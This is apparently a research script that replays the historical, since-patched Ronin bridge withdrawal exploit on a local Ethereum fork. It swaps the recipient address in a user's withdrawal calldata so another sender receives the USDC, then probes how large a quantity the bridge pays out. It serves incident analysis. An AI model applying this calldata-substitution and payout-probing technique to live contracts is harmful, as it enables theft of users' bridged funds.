"""LOCAL anvil-fork demo of the 'replace the addresses and simulate' step on the HISTORICAL Ronin withdrawal (Aug 2024, since patched).

Fork block 20468847 (the block before Yoink's front-run). Nothing is broadcast to mainnet; every tx is sent to the local anvil only.
  A. Re-run Yoink's recorded calldata against its recorded bot contract (owner EOA impersonated locally) -> same outcome as on-chain?
  B. Take the *user's* public-mempool calldata (tx 0xb7c3f85a...), substitute the two recipient address words, simulate -> works from any sender.
  C. Probe the withdrawal quantity field to see where the bridge stops paying out (Yoink used 1,998,046.875 USDC = 2,000,000 * (1 - 2^-10)).
"""
import json, subprocess, sys, time, urllib.request, pathlib, os
ROOT = pathlib.Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts/lib"))
import rawfetch as r

PORT = 8598; URL = f"http://127.0.0.1:{PORT}"
BOT = "0x6980a47bee930a4584b09ee79ebe46484fbdbdd0"; OWNER = "0xfde0d1575ed8e06fbf36256bcdfa1f359281455a"
BRIDGE = "0x64192819ac13ef72bf6b5ae239ac672b43a9af08"; USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
USER_EOA = "0x5f494a30f1b71b748b71939c18446288168cdaab"
FRESH = "0x4444444444444444444444444444444444444444"   # an arbitrary local address standing in for 'some other searcher'
YOINK_TX = "0xbce5b8548db486c561948e8a177c8ccaa72810f972cee3909ea50af015a60ad8"
PRE_TX = "0x4fdd63be1aa46aa53b994e6bb30e7b26714cbe6ab1e602bd32ef4e029aa62346"   # block 20468848 tx index 0 (unrelated flash-loan arb)
USER_TX = "0xb7c3f85abd0b9ede7b64868eeb6778ea4731adb1d49f8640b7e7234e470e96c1"
FORK_BLOCK = 20468847

def rpc(m, p, timeout=300):
    req = urllib.request.Request(URL, data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": m, "params": p}).encode(), headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read())

def bal(tok, who):
    d = "0x70a08231" + "0" * 24 + who[2:]
    return int(rpc("eth_call", [{"to": tok, "data": d}, "latest"])["result"], 16)

def send(frm, to, data, value=0):
    x = rpc("eth_sendTransaction", [{"from": frm, "to": to, "data": data, "value": hex(value), "gas": hex(8_000_000), "gasPrice": "0x0"}])
    if "error" in x: return {"error": x["error"]["message"][:160]}
    for _ in range(100):
        rc = rpc("eth_getTransactionReceipt", [x["result"]])["result"]
        if rc: return {"status": int(rc["status"], 16), "gasUsed": int(rc["gasUsed"], 16), "hash": x["result"]}
        time.sleep(0.2)
    return {"error": "no receipt"}

def main():
    yoink_in = r.rpc("eth_getTransactionByHash", [YOINK_TX], key="tx_" + YOINK_TX)["input"]
    user_in = r.rpc("eth_getTransactionByHash", [USER_TX], key="tx_" + USER_TX)["input"]
    p = subprocess.Popen([os.path.expanduser("~/.foundry/bin/anvil"), "--port", str(PORT), "--silent", "--fork-url", "https://eth.drpc.org", "--fork-block-number", str(FORK_BLOCK),
                          "--block-base-fee-per-gas", "0", "--no-rate-limit"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    out = {"fork_block": FORK_BLOCK, "note": "local fork only, nothing broadcast"}
    try:
        for _ in range(60):
            try:
                rpc("eth_blockNumber", []); break
            except Exception: time.sleep(1)
        for a in (OWNER, FRESH): rpc("anvil_setBalance", [a, hex(10**20)])
        rpc("anvil_impersonateAccount", [OWNER]); rpc("anvil_impersonateAccount", [FRESH])
        # A. Yoink recorded calldata. Yoink's hard-coded WETH amounts were simulated on the exact in-block state, i.e. AFTER block tx #0
        #    (an unrelated Balancer flash-loan arb that moved the same Uniswap v3 pool), so replay that tx first.
        snap = rpc("evm_snapshot", [])["result"]
        pre = r.rpc("eth_getTransactionByHash", [PRE_TX], key="tx_" + PRE_TX)
        rpc("anvil_setBalance", [pre["from"], hex(10**20)]); rpc("anvil_impersonateAccount", [pre["from"]])
        out["A_pre_tx_replay"] = send(pre["from"], pre["to"], pre["input"], int(pre["value"], 16))
        b0 = int(rpc("eth_getBalance", [BOT, "latest"])["result"], 16)
        res = send(OWNER, BOT, yoink_in, 999)
        b1 = int(rpc("eth_getBalance", [BOT, "latest"])["result"], 16)
        cb = rpc("eth_getBlockByNumber", ["latest", False])["result"]["miner"]
        out["A_yoink_replay"] = {**res, "bot_eth_delta": (b1 - b0) / 1e18, "bridge_usdc_after": bal(USDC, BRIDGE) / 1e6,
                                 "onchain_bot_eth_to_coinbase": 795.615040934472, "note": "bot_eth_delta = profit - bribe + 999 wei; coinbase got the bribe locally"}
        rpc("evm_revert", [snap])
        # B. user calldata with the recipient words substituted (a different sender / address)
        body = user_in[10:]
        sub = body.replace(USER_EOA[2:].rjust(64, "0"), FRESH[2:].rjust(64, "0"))
        n_sub = body.count(USER_EOA[2:].rjust(64, "0"))
        snap = rpc("evm_snapshot", [])["result"]
        u0 = bal(USDC, FRESH)
        res = send(FRESH, BRIDGE, "0x4d0d6673" + sub)
        out["B_substituted_user_calldata"] = {**res, "address_words_substituted": n_sub, "recipient_usdc_received": (bal(USDC, FRESH) - u0) / 1e6,
                                                  "user_original_qty_usdc": int(body[64 * 10:64 * 11], 16) / 1e6}
        rpc("evm_revert", [snap])
        # C. quantity probe (word index 10 of the receipt)
        probes = {}
        for label, q in [("user_qty_2640.82", int(body[64 * 10:64 * 11], 16)), ("yoink_qty_1998046.875", 1_998_046_875_000), ("2,000,000 exactly", 2_000_000_000_000),
                         ("1,998,046.876", 1_998_046_876_000), ("1,999,000", 1_999_000_000_000), ("1,999,999.999999", 1_999_999_999_999),
                         ("2,000,000.000001", 2_000_000_000_001), ("5,000,000", 5_000_000_000_000), ("34,000,000", 34_000_000_000_000)]:
            snap = rpc("evm_snapshot", [])["result"]
            q_hex = hex(q)[2:].rjust(64, "0")
            body_q = sub[:64 * 10] + q_hex + sub[64 * 11:]
            u0 = bal(USDC, FRESH)
            res = send(FRESH, BRIDGE, "0x4d0d6673" + body_q)
            probes[label] = {**res, "recipient_usdc_received": (bal(USDC, FRESH) - u0) / 1e6}
            rpc("evm_revert", [snap])
        out["C_quantity_probe"] = probes
    finally:
        p.terminate()
    (ROOT / "research/bot-re/fork_replay_results.json").write_text(json.dumps(out, indent=1))
    print(json.dumps(out, indent=1))

if __name__ == "__main__":
    main()
